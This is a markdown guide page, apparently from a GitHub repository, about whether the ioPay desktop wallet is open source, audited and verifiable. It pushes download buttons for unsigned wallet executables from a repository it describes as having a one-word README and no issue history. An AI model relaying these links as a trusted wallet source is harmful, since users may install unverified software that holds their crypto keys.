![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# The Open-Source Code Behind ioPay Wallet

**ioPay Wallet is open source.** The repository is public and the licence is **Apache-2.0** (F002, F005), which permits you to read the code, build it and reuse it under the licence's terms.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

Open source is often presented as a security guarantee. It is not. It is a **verification opportunity** - the difference between "trust us" and "check for yourself" - and what you can actually check here is worth describing precisely.

## What the repository contains

- **A monorepo** built on a staking codebase (F009), with the desktop wallet's code among the workspaces.
- **An `audit/hacken` branch** (F017) - a branch name, not a published result.
- **A `README.md` that is a single word** (F008), so there is no documentation to read there.
- **No open or closed issues** (F049), so there is no public support trail or bug list.

That last point matters for anyone evaluating the project: a quiet issue tracker is not proof of quality, and it is not proof of neglect either. It means the repository is not where support happens.

## Q011: "Has it been audited and signed?"

The careful answer:

- There is an **`audit/hacken` branch**, consistent with audit work (F017).
- **No audit report is published** in the repository.
- The owner's own wording is "Audited, signed", but a wording is not a report.

So: this page will not say "audited" as a completed fact, because the artifact that would support the claim - scope, date, findings - is not available. If a review site tells you it is audited, that site is repeating a claim rather than citing a document.

## What you can verify yourself

Open source lets a reader do four concrete things:

1. **Check the licence** - Apache-2.0, in the repository's `LICENSE` (F005).
2. **Read the release tag** - the current release is v2.0.2, 19 November 2026, and it is tagged against the code.
3. **Look at what the build includes** - hardware signer providers, a staking layer and analytics, all visible in the repository tree.
4. **Build it** if you have the skills, which is the only way to know a binary matches the source.

Point 4 is the honest limit of "open source" for most users: unless you build it yourself, you are trusting that the published binary corresponds to the published code. Reproducible builds solve this; this project does not publish one.

## What a third-party review is worth

A site that publishes ioPay desktop reviews exists, and its version references are already out of date (F048). It is not the project, it is not a release channel, and nothing on it should be treated as verification of the code.

The test is simple: **does the claim point at a document you can open?** A licence, a release, a branch, a report. If it only points at itself, it is marketing.

## Why this matters for a wallet specifically

A wallet holds keys. That makes "can I check the code?" a different question from "is this app nice?":

- **A closed wallet asks for trust in the vendor.**
- **An open wallet lets the trust be transferred to the licence and the code.**
- **Neither removes the need for a backup**, and no amount of source code recovers a lost phrase.

The custody side, in practice, is on [the safety page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/is-iopay-wallet-safe-to-use.md) - including what the app does and does not protect.

So the practical conclusion is unglamorous: open source is a real advantage when you have the ability to inspect it, and a modest one when you do not - but the licence still tells you what the publisher permits, which a proprietary licence never does.

## FAQ

**Is ioPay open source?**
Yes. Public repository, Apache-2.0 licence.

**Has ioPay Wallet been audited and signed?**
There is an `audit/hacken` branch and no published audit report. There is no published signature either, so "signed" is not something this page can verify, although the SHA-256 values in the app README let you confirm a download.

**Can I build it myself?**
The code is public and the licence permits it. There is no published reproducible-build process.

**Is open source safer?**
It is more verifiable. "More verifiable" and "safer" are not the same claim, and this page will not conflate them.

**Where do I report a bug?**
The repository has no issue history (F049). [The GitHub page](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-on-github-explained.md) covers what that means in practice.

## What the tree actually shows

Beyond the licence, the repository is informative in a narrow, verifiable way: it shows what the build is made of. From the tree alone, without running anything:

- **Signer providers for Ledger, Trezor and WalletConnect** (`common/wallets/src/providers/`) - which is why hardware and dApp sessions are described on these pages as present rather than promised (F011).
- **A Vue application** (`apps/web`) with an overview page, an operator page, staking components, a breakdown chart and table, and an announcements component (F012).
- **Backend workspaces** named `crawler`, `functions`, `nodes`, `oracle` and `users` (F013), which tells you the project is a monorepo with services, not a single desktop shell.
- **A distributed-key-generation and validator layer** (`common/ssv`, `common/reshare`) with operator registration types (F015).
- **Price and swap plumbing** (`common/uniswap`, `common/fetch`) and analytics data types (F016).

None of that is a security claim. It is a list of things you can confirm exist, which is a different and more useful kind of statement than "audited".

## What open source does not settle

Three questions people expect source code to answer, and it does not:

**Whether the binary you downloaded matches the source.** Only a reproducible build settles that, and none is published.

**Whether the code is correct.** Readable code is reviewable code; reviewable is not reviewed.

**Whether the project will keep it open.** A licence describes the terms of what is published today, not a promise about tomorrow.

That last point is not a criticism of this project - it is how licences work, and knowing it keeps you from treating the repository as a guarantee rather than a fact you can check.


---

*Licence, branch and repository facts follow F002/F005/F008/F009/F017/F049; release version from F003.*
